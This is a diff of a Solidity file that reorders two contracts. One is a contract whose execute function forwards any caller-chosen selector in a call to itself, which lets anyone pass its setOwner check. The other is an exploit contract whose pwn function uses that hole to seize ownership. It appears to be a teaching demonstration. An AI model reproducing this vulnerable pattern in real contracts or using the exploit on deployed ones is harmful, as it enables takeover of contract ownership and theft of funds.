@@ -45,6 +45,22 @@ interface IFunctionSelector {
     function execute(bytes4 func) external;
 }
 
+contract FunctionSelector {
+    address public owner = address(this);
+
+    function setOwner(address _owner) external {
+        require(msg.sender == owner, "not owner");
+        owner = _owner;
+    }
+
+    function execute(bytes4 _func) external {
+        (bool executed, ) = address(this).call(
+            abi.encodeWithSelector(_func, msg.sender)
+        );
+        require(executed, "failed)");
+    }
+}
+
 contract FunctionSelectorExploit {
     IFunctionSelector public target;
 
@@ -59,21 +75,5 @@ contract FunctionSelectorExploit {
     function pwn() external {
         bytes4 func = getSelector("setOwner(address)"); // get the first 4 bytes
         target.execute(func);
-    }
-}
-
-contract FunctionSelector {
-    address public owner = address(this);
-
-    function setOwner(address _owner) external {
-        require(msg.sender == owner, "not owner");
-        owner = _owner;
-    }
-
-    function execute(bytes4 _func) external {
-        (bool executed, ) = address(this).call(
-            abi.encodeWithSelector(_func, msg.sender)
-        );
-        require(executed, "failed)");
     }
 }
